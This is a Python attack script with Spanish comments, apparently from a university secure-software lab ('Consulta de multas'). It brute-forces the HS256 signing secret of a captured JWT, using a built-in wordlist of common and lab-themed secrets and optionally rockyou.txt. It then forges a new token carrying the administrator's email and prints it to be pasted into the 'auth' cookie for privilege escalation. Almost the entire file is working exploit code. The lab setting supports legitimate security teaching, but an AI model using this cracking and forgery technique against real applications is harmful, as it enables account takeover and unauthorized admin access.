#!/usr/bin/env python3
# Crackea el secreto HS256 de un JWT y re-firma un token con el email del admin.
# Lab "Consulta de multas" - Software Seguro. Autocontenido (no requiere PyJWT).

import hmac
import hashlib
import base64
import json
import os

# --- Token original capturado de la cookie "auth" (el de Ignacio) ---
TOKEN = ("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
         "eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImlnbmFjaW9fMTIzQHlvcG1haWwuY29tIiwiZXhwIjoxN"
         "zk1MDE0NjAyLCJlbWFpbCI6ImlnbmFjaW9fMTIzQHlvcG1haWwuY29tIiwib3JpZ19pYXQiOjE3OTQ0MDk4MDJ9."
         "FGoloAzL9Hcvdm5wGb5u50J70Wl216NSpcZPHnaoc7g")

EMAIL_ADMIN = "administrador_multas@yopmail.com"

# Diccionario: si tenes rockyou, poné su ruta; si no, usa la lista corta de abajo.
ROCKYOU = r"C:\ruta\a\rockyou.txt"   # opcional; dejalo asi si no lo tenes

COMUNES = [
    # genericos
    "secret", "secreto", "password", "Password", "123456", "12345678", "1234567890",
    "clave", "admin", "administrador", "jwt", "jwtsecret", "jwt_secret", "JWT_SECRET",
    "supersecret", "super_secret", "supersecreto", "changeme", "change_me", "default",
    "test", "testing", "key", "secretkey", "secret_key", "SECRET_KEY", "mysecret",
    "mysecretkey", "s3cr3t", "s3cr3tk3y", "P@ssw0rd", "qwerty", "letmein", "root",
    "toor", "ignacio", "ignacio_123", "none", "null", "0", "1", "true",
    # django / drf-jwt tipicos
    "django", "djangosecret", "django_secret", "django-insecure", "insecure",
    "django-insecure-key", "DjangoSecretKey", "djangojwt", "drf", "drfjwt",
    "rest_framework", "restframework", "hunter2", "passw0rd", "secret123",
    "secreto123", "admin123", "clave123", "123", "abc123", "password123",
    # tematicos del lab
    "multas", "consulta_multas", "consultamultas", "consulta-multas", "multas123",
    "softwareseguro", "software_seguro", "software-seguro", "SoftwareSeguro",
    "softwareseguro123", "seguro", "seguridad", "challenge", "ctf", "lab",
    "pista", "flag", "escalamiento", "privilegios", "token", "auth", "authsecret",
    # frases / years
    "secret2024", "secret2025", "secret2026", "claveSecreta", "ClaveSecreta",
    "laclavesecreta", "esteeselsecreto", "estoesunsecreto", "nolosabes",
    "yopmail", "administrador_multas", "adminmultas", "admin_multas",
]

def b64url_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

header_b64, payload_b64, sig_b64 = TOKEN.split(".")
signing_input = (header_b64 + "." + payload_b64).encode()
firma_real = b64url_decode(sig_b64)

def prueba(secreto):
    firma = hmac.new(secreto.encode(), signing_input, hashlib.sha256).digest()
    return hmac.compare_digest(firma, firma_real)

def candidatos():
    for c in COMUNES:
        yield c
    if os.path.exists(ROCKYOU):
        with open(ROCKYOU, "r", encoding="latin-1", errors="ignore") as f:
            for linea in f:
                yield linea.rstrip("\n")

# --- Fase 1: crackear ---
print("Probando diccionario...")
secreto = None
for i, cand in enumerate(candidatos(), 1):
    if prueba(cand):
        secreto = cand
        print(f"\n[+] SECRETO ENCONTRADO: {secreto!r}  (intento {i})")
        break
    if i % 100000 == 0:
        print(f"  ... {i} probados")

if not secreto:
    print("\n[-] No se encontro el secreto con este diccionario.")
    print("    Proba apuntar ROCKYOU a tu rockyou.txt y volve a correr.")
    raise SystemExit(1)

# --- Fase 2: re-firmar token de admin ---
payload = json.loads(b64url_decode(payload_b64))
payload["username"] = EMAIL_ADMIN
payload["email"] = EMAIL_ADMIN

nuevo_header_b64 = b64url_encode(json.dumps({"typ": "JWT", "alg": "HS256"},
                                            separators=(",", ":")).encode())
nuevo_payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
nuevo_signing = (nuevo_header_b64 + "." + nuevo_payload_b64).encode()
nueva_firma = b64url_encode(hmac.new(secreto.encode(), nuevo_signing, hashlib.sha256).digest())

token_admin = f"{nuevo_header_b64}.{nuevo_payload_b64}.{nueva_firma}"

print("\n" + "=" * 60)
print("TOKEN DE ADMIN (pegalo en la cookie 'auth' y recarga /perfil/):")
print(token_admin)
print("=" * 60)
